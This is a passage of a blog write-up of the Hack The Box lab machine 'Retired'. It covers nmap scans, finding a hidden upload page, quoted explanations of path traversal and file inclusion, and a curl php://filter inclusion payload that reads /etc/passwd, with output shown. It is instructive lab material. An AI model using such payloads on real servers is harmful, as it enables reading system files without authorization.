<html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=icon href=/images/favicon.svg><link rel=stylesheet href=/scss/global.min.d3cc96f4d8384649c41cedbcf73d695dedba18e800978f9ab7f79a1b6fd908ee.css><link rel=stylesheet href=/css/prism.css><link href="https://fonts.googleapis.com/css?family=Merriweather&display=swap" rel=stylesheet><title>Retired From Hack The Box - Medium Machine | My Blog</title>
<meta name=description content="Recon: Nmap Scan: Quick Nmap Scan: Open Ports: 80 (http) - 22 (ssh) ~ ❯ nmap 10.10.11.154 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 23:25 CET Nmap scan report for 10.10.11.154 Host is up (0.026s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 2.74 seconds Nmap Full Port Scan: ~ ❯ nmap -p- 10."><meta property="og:title" content="Retired From Hack The Box - Medium Machine | My Blog"><meta property="og:site_name" content="My Blog"><meta property="og:description" content="Recon: Nmap Scan: Quick Nmap Scan: Open Ports: 80 (http) - 22 (ssh) ~ ❯ nmap 10.10.11.154 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 23:25 CET Nmap scan report for 10.10.11.154 Host is up (0.026s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 2.74 seconds Nmap Full Port Scan: ~ ❯ nmap -p- 10."><meta property="og:url" content="https://gokupwn.github.io/posts/retired-htb-machine/"><meta property="og:type" content="website"><meta property="og:locale" content="en_US"><meta property="og:image" content='https://gokupwn.github.io/images/default.jpg'><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Retired From Hack The Box - Medium Machine | My Blog"><link rel=canonical href=https://gokupwn.github.io/posts/retired-htb-machine/><meta name=twitter:description content="Recon: Nmap Scan: Quick Nmap Scan: Open Ports: 80 (http) - 22 (ssh) ~ ❯ nmap 10.10.11.154 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 23:25 CET Nmap scan report for 10.10.11.154 Host is up (0.026s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 2.74 seconds Nmap Full Port Scan: ~ ❯ nmap -p- 10."><meta name=twitter:image content="https://gokupwn.github.io/images/default.jpg"><meta property="article:published_time" content="2022-05-12T16:05:10+01:00"><meta property="article:updated_time" content="2022-05-12T16:05:10+01:00"></head><body class=line-numbers><script src=/js/initColors.js></script><div class=layout-styled><section class=section><div class=nav-container><a class=logo-link href=/><div id=logo-desktop><svg width="192" height="23" viewBox="0 0 192 23" fill="none" xmlns="http://www.w3.org/2000/svg" className="Logo__Desktop"><g clipPath="url(#clip0)"><path d="M120.941 6.15477h1.512V2.83255l1.661-.38333V6.15477H126.713v1.15H124.114V16.377C124.114 17.314 124.54 17.7826 125.435 17.7826 125.925 17.7826 126.478 17.6335 126.904 17.4205L127.181 18.4214C126.606 18.7835 125.861 18.9964 124.86 18.9964c-1.321.0-2.428-.617600000000003-2.428-2.4703V7.30477H120.92v-1.15H120.941z" fill="#7a8085"/><path d="M131.739 7.77334C132.825 6.70852 134.273 5.89926 135.764 5.89926c1.959.0 3.173 1.04352 3.173 3.27963V17.6122L140.555 17.8465V18.7409h-3.322V9.58352C137.233 7.9863 136.616 7.30482 135.338 7.30482 134.166 7.30482 132.74 8.0076 131.739 8.90204V17.5909L133.442 17.8039V18.7196H128.416V17.8039L130.078 17.5909V1.29926L128.374 1.04371V.0214844H131.739V7.77334v0z" fill="#7a8085"/><path d="M141.854 12.4374C141.854 7.6883 143.92 5.89941 146.731 5.89941c2.917.0 4.536 1.7463 4.536 6.06949v.6601H143.6C143.621 16.3772 144.686 17.8253 147.284 17.8253 148.605 17.8253 149.584 17.3994 150.5 16.7818L151.096 17.6124C150.01 18.5068 148.754 18.9966 147.008 18.9966 143.941 18.9753 141.854 17.2929 141.854 12.4374zM143.621 11.5216H149.521C149.521 8.34849 148.754 6.98552 146.709 6.98552 144.857 6.98552 143.771 8.2633 143.621 11.5216z" fill="#7a8085"/><path d="M162.682 7.85849C163.768 6.70849 165.024 5.87793 166.515 5.87793c1.959.0 3.131 1.04352 3.131 3.27963V17.6335L171.286 17.8677v.8306H167.963V9.68997C167.963 8.07145 167.388 7.32608 166.089 7.32608 164.918 7.32608 163.789 8.02886 162.81 8.9233v8.6889L164.449 17.8464V18.7409h-3.322V9.68997C161.127 8.07145 160.552 7.32608 159.253 7.32608 158.082 7.32608 156.953 8.02886 155.973 8.9233v8.6889L157.677 17.8464V18.7409H152.651V17.8464L154.312 17.6122V7.47515l-1.703-.25555V6.15478H155.654L155.888 7.85849C156.974 6.72978 158.188 5.89923 159.679 5.89923 161.212 5.87793 162.277 6.51682 162.682 7.85849z" fill="#7a8085"/><path d="M171.925 12.4374C171.925 7.6883 173.991 5.89941 176.802 5.89941c2.917.0 4.536 1.7463 4.536 6.06949v.6601h-7.667C173.692 16.3772 174.757 17.8253 177.355 17.8253 178.676 17.8253 179.655 17.3994 180.571 16.7818L181.167 17.6124C180.081 18.5068 178.825 18.9966 177.079 18.9966 174.012 18.9753 171.925 17.2929 171.925 12.4374zM173.692 11.5216h5.899C179.591 8.34849 178.825 6.98552 176.78 6.98552 174.928 6.98552 173.863 8.2633 173.692 11.5216z" fill="#7a8085"/><path d="M183.084 18.0383V15.504H184.234L184.618 17.442C185.278 17.7189 185.789 17.8892 186.811 17.8892 188.664 17.8892 189.558 17.0374 189.558 15.5466c0-1.4907-.72399999999999-2.0657-2.768-2.662C184.831 12.2883 183.382 11.4577 183.382 9.13645 183.382 7.39016 184.639 5.89941 187.195 5.89941 188.664 5.89941 189.835 6.17627 190.687 6.68738V9.15775H189.558L189.132 7.34756C188.579 7.09201 187.961 7.00682 187.258 7.00682 185.789 7.00682 184.852 7.7309 184.852 8.98738 184.852 10.3077 185.576 10.8189 187.365 11.3513c2.066.6602 3.791 1.3629 3.791 4.0463C191.156 17.7615 189.431 18.9753 186.79 18.9753 185.235 18.9753 183.957 18.6346 183.084 18.0383z" fill="#7a8085"/><path class="change-fill" d="M38.3122 9.98811C38.3122 8.66774 37.9501 8.15663 36.9492 8.15663 36.1186 8.15663 35.0964 8.62515 34.3936 9.20015V16.9733L35.8418 17.165v1.4694h-5.75V17.165L31.5825 16.9733V8.24182L30.0918 7.92237v-1.725h3.8333L34.2446 7.64552C35.3733 6.55941 36.6298 5.87793 38.1418 5.87793 39.9946 5.87793 41.102 6.92145 41.102 9.07237V16.9733L42.5927 17.165v1.4694H38.3122V9.98811v0z" fill="#000"/><path class="change-fill" d="M62.3982 17.1858v1.4695h-6.325V17.1858L57.564 16.9942V8.2627l-1.4908-.31944v-1.725h3.7695L60.226 8.17752C61.0779 6.85715 62.1427 5.94141 63.6973 5.94141 63.8677 5.94141 64.0594 5.9627 64.1871 6.0053L63.8251 8.94418C63.5483 8.81641 63.2501 8.77381 62.8668 8.77381 61.8871 8.77381 61.1418 9.05067 60.3751 9.71085V16.9516L62.3982 17.1858z" fill="#000"/><path class="change-fill" d="M76.7098 6.19733h1.3843V3.08807l2.4491-.53241V6.21863h2.4277V8.0927H80.5432v7.5815C80.5432 16.5899 80.8839 16.9946 81.6293 16.9946 82.0978 16.9946 82.5876 16.8455 82.907 16.6751L83.3543 18.3575C82.758 18.6983 81.9061 18.9751 80.6709 18.9751 78.9672 18.9751 78.0941 18.1658 78.0941 16.0362V8.0927H76.7098V6.19733z" fill="#000"/><path class="change-fill" d="M90.4664 17.1648v1.4695H84.6738V17.1648L86.1646 16.9731V8.24167L84.6738 7.92222v-1.725h4.3019V16.9731L90.4664 17.1648zM85.696 1.76759C85.696.787963 86.4627.0 87.4423.0 88.422.0 89.1886.766667 89.1886 1.76759 89.1886 2.72593 88.422 3.51389 87.421 3.51389 86.4627 3.51389 85.696 2.72593 85.696 1.76759z" fill="#000"/><path class="change-fill" d="M98.3251 7.90097V6.19727H103.053v1.725L101.924 8.11393 98.3251 18.6556H95.663L92.064 8.09264 90.9991 7.92227v-1.725h5.2602v1.7037L95.0242 8.09264 96.7279 13.6084C97.0473 14.6519 97.1964 15.5037 97.3668 16.4834H97.388C97.5371 15.525 97.7714 14.5241 98.0482 13.5871l1.6186-5.51576L98.3251 7.90097z" fill="#000"/><path class="change-fill" d="M75.6867 17.1224C74.5793 17.1437 74.3664 16.952 74.3664 15.9724V9.79645c0-2.83241-1.3843-3.91852-4.0463-3.91852-1.938.0-3.5778.575-4.8982 1.40556L66.2312 9.02978C67.3599 8.45478 68.4673 8.09274 69.7238 8.09274 71.1932 8.09274 71.5552 8.88071 71.5552 10.265V11.0316 11.2233v1.5546V12.8844v3.237C71.0867 16.6326 70.4052 17.0585 69.4469 17.0585 68.3821 17.0585 67.871 16.5261 67.871 15.0353c0-1.725.724100000000007-2.2148 2.6194-2.2574V11.2233C66.6358 11.2659 65.0386 12.4372 65.0386 15.2057c0 2.6408 1.4481 3.7695 3.6203 3.7695 1.5547.0 2.40649999999999-.6602 3.1306-1.4056C72.0451 18.5705 72.833 18.9752 73.8978 18.9752 74.6645 18.9752 75.3886 18.7622 75.8571 18.5066L75.6867 17.1224z" fill="#000"/><path class="change-fill" d="M54.4968 17.1224C53.3894 17.1437 53.1764 16.952 53.1764 15.9724V9.79645c0-2.83241-1.3842-3.91852-4.0463-3.91852-1.9379.0-3.5778.575-4.8981 1.40556L45.0412 9.02978C46.1699 8.45478 47.2773 8.09274 48.5338 8.09274 50.0033 8.09274 50.3653 8.88071 50.3653 10.265V11.0316 11.2233v1.5546V12.8844v3.237C49.8968 16.6326 49.2153 17.0585 48.257 17.0585 47.1922 17.0585 46.681 16.5261 46.681 15.0353c0-1.725.7241-2.2148 2.6195-2.2574V11.2233C45.4459 11.2659 43.8486 12.4372 43.8486 15.2057c0 2.6408 1.4482 3.7695 3.6204 3.7695 1.5546.0 2.4065-.6602 3.1306-1.4056C50.8551 18.5705 51.6431 18.9752 52.7079 18.9752 53.4746 18.9752 54.1986 18.7622 54.6672 18.5066L54.4968 17.1224z" fill="#000"/><path class="change-fill" d="M107.653 13.055H113.594V11.9476C113.594 7.47534 111.869 5.89941 108.803 5.89941c-3.173.0-5.175 1.89537-5.175 6.51669.0 4.6852 1.895 6.5805 5.43000000000001 6.5805C110.954 18.9966 112.231 18.5068 113.467 17.5272L112.657 16.0577c-.978999999999999.6176-1.789 1.001-3.194 1.001C107.546 17.0587 106.801 16.1855 106.63 14.0133 106.588 13.6939 106.567 13.0976 106.567 12.4587c0-.4047.0-.788.0210000000000008-1.0861V11.3513C106.737 8.51886 107.397 7.60312 108.781 7.60312c1.619.0 2.002.979630000000001 2.002 3.74818H107.674V13.055H107.653z" fill="#000"/><path class="change-fill" d="M17.5907 20.2954H0V23H17.5907V20.2954z" fill="#000"/><path class="change-fill" d="M0 7.96484V18.9537l5.38796-3.7694v-3.45L0 7.96484z" fill="#000"/><path class="change-fill" d="M17.5689 10.9463V0L12.1597 3.74815V7.13426l5.4092 3.81204z" fill="#000"/><path class="change-fill" d="M17.5907 18.975 17.5694 12.288.0.0V6.62315L17.5907 18.975z" fill="#000"/></g><defs><clipPath id="clip0"><rect width="191.156" height="23" fill="#fff"/></clipPath></defs></svg></div><div id=logo-mobile class=hidden><svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 512 512"><g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="" stroke="none"><path d="M590 4383l1-738 756-530c698-489 1151-807 2618-1837l540-380 3 748c2 590-1 751-10 760-7 7-308 218-668 470-360 251-1230 859-1933 1351-702 491-1284 893-1292 893-13 0-15-92-15-737z"/><path d="M3887 4708l-597-412v-381-381l597-419c328-231 602-421 610-423 11-3 13 204 13 1212 0 987-2 1216-13 1216-7 0-282-186-610-412z"/><path d="M590 2135c0-910 3-1225 11-1225 10 0 343 231 1049 728l155 109v389 388l-595 418c-327 229-601 417-607 418-10 0-13-251-13-1225z"/><path d="M590 320V10h1960 1960v310 310H2550 590V320z"/></g></svg></div><span class=header-hidden>Navigate back to the homepage</span></a><div class=nav-controls><button id=copyButton class=icon-wrapper><svg class="icon-image" width="24" height="20" viewBox="0 0 24 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M2 5C2 3.34328 3.34328 2 5 2h9c1.6567.0 3 1.34328 3 3V9c0 1.6567-1.3433 3-3 3H10C9.44771 12 9 12.4477 9 13S9.44771 14 10 14h4c2.7613.0 5-2.2387 5-5V5c0-2.76128-2.2387-5-5-5H5C2.23872.0.0 2.23872.0 5V9c0 1.4938.656313 2.8361 1.6935 3.7509C2.10768 13.1163 2.73961 13.0767 3.10494 12.6625 3.47028 12.2483 3.43068 11.6164 3.0165 11.2511 2.39169 10.6999 2 9.89621 2 9V5zm5 6c0-1.65672 1.34328-3 3-3h4C14.5523 8 15 7.55228 15 7S14.5523 6 14 6H10C7.23872 6 5 8.23872 5 11v4c0 2.7613 2.23872 5 5 5h9c2.7613.0 5-2.2387 5-5V11C24 9.50621 23.3437 8.16393 22.3065 7.24906 21.8923 6.88372 21.2604 6.92332 20.8951 7.3375 20.5297 7.75168 20.5693 8.38361 20.9835 8.74894 21.6083 9.30007 22 10.1038 22 11v4c0 1.6567-1.3433 3-3 3H10c-1.65672.0-3-1.3433-3-3V11z" fill="#000"/></svg><div id=toolTip class=tool-tip>copied</div><input id=copyText style=opacity:0 type=text class=tool-tip>
</button>
<button id=themeColorButton class=icon-wrapper><div id=sunRays class=sun-rays></div><div id=moonOrSun class=moon-or-sun></div><div id=moonMask class=moon-mask></div></button></div></div></section><script src=/js/toggleLogos.js></script><script src=/js/toggleColors.js></script><script src=/js/copyUrl.js></script><section class="section narrow"><section id=articleHero class="section narrow"><div class=article-hero><header class=article-header><h1 class=article-hero-heading>Retired From Hack The Box - Medium Machine</h1><div class=article-hero-subtitle><div class=article-meta><div class=article-coauthors-container><span id=collapsedCoauthors class=article-coauthors-collapsed><div class=article-coauthors-list style=width:0></div><strong class=article-coauthors-name-container></strong><div class=article-coauthors-icon-container><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path style="fill:var(--primary)" d="M5.3209 8.86719 8.50026 12.0396 11.6796 8.86719 12.6563 9.84385 8.50026 13.9999 4.34424 9.84385 5.3209 8.86719z"/><path style="fill:var(--primary)" d="M11.6791 8.13281 8.49974 4.96039 5.32039 8.13281 4.34373 7.15615 8.49974 3.00013 12.6558 7.15615 11.6791 8.13281z"/></svg></div></span><ul id=uncollapsedCoauthors class="article-coauthors-list-open hidden"><div id=uncollapsedAction class=article-icon-open-container><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path style="fill:var(--primary)" d="M11.6796 14 8.50023 10.8276 5.32088 14 4.34422 13.0233 8.50023 8.86732 12.6563 13.0233 11.6796 14z"/><path style="fill:var(--primary)" d="M5.32041 3 8.49977 6.17243 11.6791 3 12.6558 3.97666 8.49977 8.13268 4.34375 3.97666 5.32041 3z"/></svg></div></ul></div><script src=/js/collapseAuthors.js></script>May 12, 2022
• 28 min read</div></div></header><div class=article-hero-image id=ArticleImage__Hero><img src=/images/default.jpg></div></div></section><aside id=progressBar class=aside-container><div class=aside-align><div><div class=overlap-container></div></div></div><div class=progress-container tabindex={-1}><div class=track-line aria-hidden=true><div id=progressIndicator class=progress-line></div></div></div></aside><article id=articleContent class=post-content style=position:relative><h1 id=recon>Recon:</h1><h2 id=nmap-scan>Nmap Scan:</h2><h3 id=quick-nmap-scan>Quick Nmap Scan:</h3><ul><li>Open Ports: 80 (http) - 22 (ssh)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ nmap 10.10.11.154
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-07 23:25 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.154
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.026s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 2.74 seconds
</span></span></code></pre></div><h3 id=nmap-full-port-scan>Nmap Full Port Scan:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ nmap -p- 10.10.11.154
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-07 23:29 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.154
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.051s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 58.07 seconds
</span></span></code></pre></div><h3 id=nmap-services-version-fingerprinting>Nmap Services Version Fingerprinting:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ nmap -p80,22 -sV -sC 10.10.11.154
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-07 23:34 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.154
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.025s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian <span style=color:#ae81ff>5</span> <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx
</span></span><span style=display:flex><span>| http-title: Agency - Start Bootstrap Theme
</span></span><span style=display:flex><span>|_Requested resource was /index.php?page<span style=color:#f92672>=</span>default.html
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 10.32 seconds
</span></span></code></pre></div><h3 id=recon-web-application---port-80-http>Recon: Web Application - Port: 80 (http)</h3><ul><li><p><strong>Main Page</strong>:
<img src=/images/Pasted-image-20221207233632.png alt="Image alt"></p></li><li><p>Web Tech Stack:
<img src=/images/Pasted-image-20221207233725.png alt="Image alt"></p></li><li><p>Using wappalyzer firefox extension we can get intial idea about the web tech stack used:</p><ul><li>Back-end programming language: PHP</li><li>Server: Nginx</li></ul></li><li><p><strong>Contact Us</strong>: - The form seems to not be submitted to the backend server:
<img src=/images/Pasted-image-20221207234040.png alt="Image alt"></p></li><li><p>Our Services:
<img src=/images/Pasted-image-20221207234251.png alt="Image alt"></p></li></ul><p><strong>EMUEMU</strong>: Coming soon: The official software emulator for OSTRICH roms. We want to encourage a vibrant community and have made it our goal to provide an easily hackable software-only way to get started with the OSTRICH platform. This emulator should satisfy all you customization and development needs. (This is currently <strong>only open for <em>beta</em> testers</strong> who already purchased an OSTRICH)</p><ul><li>HTTP Get Parameter:<ul><li>From the URL, We can detect a GET parameter submitted to the backend server: http://10.10.11.154/index.php?page=default.html</li><li>The GET parameter <em>page</em>.</li><li>The current value of the <em>page</em> query parameter is <em>default.html</em></li><li>Based on the parameter name and value, we can conclude that the variable is used to load the main page website (<em>default.html</em>).</li><li>The web applciaton load the page specified by the page parameter&rsquo;s value.</li><li>We can test if the parameter is vulnerable to path traversal or if we can reveal a secret page.</li></ul></li></ul><h4 id=revealing-the-_betahtml_-page>Revealing the <em>beta.html</em> page:</h4><ul><li>This phrase catched my eyes: This is currently <strong>only open for <em>beta</em> testers</strong> who already purchased an OSTRICH</li><li><strong>For beta testers</strong>: So i decided to tries beta.php or beta.html</li></ul><p><img src=/images/Pasted-image-20221207235719.png alt="Image alt"></p><ul><li><em>beta.html</em>: revealed a new page with file upload functionality (New attack vector)</li></ul><p>Currently development for EMUEMU just started, but we have big plans. If you bought an OSTRICH console from us and want want to be part of the next step, you can enable your OSTRICH license for usage with EMUEMU via the activate_license application today for our upcoming beta testing program for EMUEMU. A license files contains a 512 bit key. That key is also in the QR code contained within the OSTRICH package. Thank you for participating in our beta testing program.</p><p>Upload License Key File</p><ul><li>If we submit any file, it will be submitted to <code>activate_license.php</code></li></ul><p><img src=/images/Pasted-image-20221208000157.png alt="Image alt"></p><p>you can enable your OSTRICH license for usage with EMUEMU via the <strong>activate_license</strong> application today for our upcoming beta testing program for EMUEMU._</p><p><img src=/images/Pasted-image-20221208000400.png alt="Image alt"></p><h3 id=getting-foothold>Getting FootHold:</h3><ul><li><p>Attack Vector:</p><ul><li>http://10.10.11.154/index.php?page=default.html</li><li><em>page</em> query parameter used to load web application content</li><li>We can test if test parameter is vulnerable to path traversal and file inclusion vulnerability.</li></ul></li><li><p>Path traversal (According to chatGPT ;) )</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md><span style=display:flex><span>A path traversal vulnerability is a type of vulnerability that occurs when a program constructs a file path using user-supplied input without properly sanitizing it. This can allow an attacker to access files outside of the intended directory by providing a file path that traverses outside of the directory. For example, if a program expects a file name as input and constructs a file path using the following code:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copy code
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`char filepath[100]; sprintf(filepath, &#34;/var/www/files/%s&#34;, filename);`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>An attacker could provide the file name &#34;../../etc/passwd&#34; as input, which would result in the file path &#34;/var/www/files/../../etc/passwd&#34;. This file path traverses outside of the <span style=color:#e6db74>`/var/www/files`</span> directory and accesses the <span style=color:#e6db74>`/etc/passwd`</span> file, which contains the system&#39;s user accounts.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>To prevent path traversal vulnerabilities, it is important to properly sanitize user-supplied input before using it to construct file paths. This can involve checking the input for malicious characters and patterns, and only allowing the use of certain characters in the input. For example, the above code could be modified to only allow alphanumeric characters in the file name as follows:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copy code
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`if (!is_alphanumeric(filename)) {   error(&#34;invalid file name&#34;); } char filepath[100]; sprintf(filepath, &#34;/var/www/files/%s&#34;, filename);`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>This prevents an attacker from providing malicious input that can be used to traverse outside of the intended directory.
</span></span></code></pre></div><ul><li>File inclusion (According to chatGPT ;) )</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md><span style=display:flex><span>A file inclusion vulnerability is a type of vulnerability that occurs when a program includes a file using user-supplied input without properly sanitizing it. This can allow an attacker to include arbitrary files on the server, potentially exposing sensitive information or allowing the attacker to execute arbitrary code.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For example, consider a PHP script that uses the following code to include a file specified by the <span style=color:#e6db74>`$page`</span> variable:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copy code
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`include($page);`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>If an attacker can control the value of the <span style=color:#e6db74>`$page`</span> variable, they could provide a file path that includes a sensitive file on the server, such as the server&#39;s password file. For example, the attacker could provide the following value for <span style=color:#e6db74>`$page`</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copy code
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`/etc/passwd`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>This would cause the PHP script to include the <span style=color:#e6db74>`/etc/passwd`</span> file, exposing the server&#39;s user accounts to the attacker.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>To prevent file inclusion vulnerabilities, it is important to properly sanitize user-supplied input before using it to include files. This can involve checking the input for malicious characters and patterns, and only allowing the use of certain characters in the input. For example, the above code could be modified to only allow alphanumeric characters in the file name as follows:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copy code
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`if (!is_alphanumeric($page)) {   error(&#34;invalid file name&#34;); } include($page);`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>This prevents an attacker from providing malicious input that can be used to include arbitrary files on the server.
</span></span></code></pre></div><ul><li>Using this simple php filter trick, i was able to get the content of /etc/passwd file:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl http://10.10.11.154/index.php?page<span style=color:#f92672>=</span>php://filter/resource<span style=color:#f92672>=</span>/etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
